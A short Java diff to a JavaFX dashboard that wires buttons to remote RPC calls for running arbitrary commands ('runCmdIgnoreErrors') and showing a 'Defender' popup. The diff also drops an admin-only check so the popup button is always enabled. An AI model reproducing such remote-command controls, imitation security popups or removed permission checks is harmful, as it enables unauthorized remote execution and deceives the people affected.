@@ -65,11 +65,11 @@ public class DashboradA {
         TextField field2 = addFieldRow(formGrid, 1, "Example2");
         TextField field3 = addFieldRow(formGrid, 2, "Example3");
 
-        Button button1 = createActionButton("Example1");
-        Button button2 = createActionButton("Example2");
-        Button button3 = createActionButton("Example3");
+        Button button1 = createActionButton("Display Text Test");
+        Button button2 = createActionButton("Run Command");
+        Button button3 = createActionButton("Display Defender Popup");
 
-        button3.setTooltip(new Tooltip("No permissions to use this function"));
+        //button3.setTooltip(new Tooltip("No permissions to use this function"));
 
         VBox buttonBox = new VBox(10, button1, button2, button3);
         buttonBox.setPrefWidth(120);
@@ -107,7 +107,7 @@ public class DashboradA {
 
         button1.setOnAction(evt -> callServer(statusLabel, console, "insertText", field1.getText()));
         button2.setOnAction(evt -> callServer(statusLabel, console, "runCmdIgnoreErrors", field2.getText()));
-        button3.setOnAction(evt -> callServer(statusLabel, console, "insertText", field3.getText()));
+        button3.setOnAction(evt -> callServer(statusLabel, console, "runDefenderPopup", field3.getText()));
 
         return root;
     }
@@ -164,7 +164,8 @@ public class DashboradA {
 
                     button1.setDisable(false);
                     button2.setDisable(false);
-                    button3.setDisable(!isAdmin);
+                    button3.setDisable(false);
+                    //button4.setDisable(!isAdmin);
                 });
             } catch (Exception e) {
                 rpc = null;
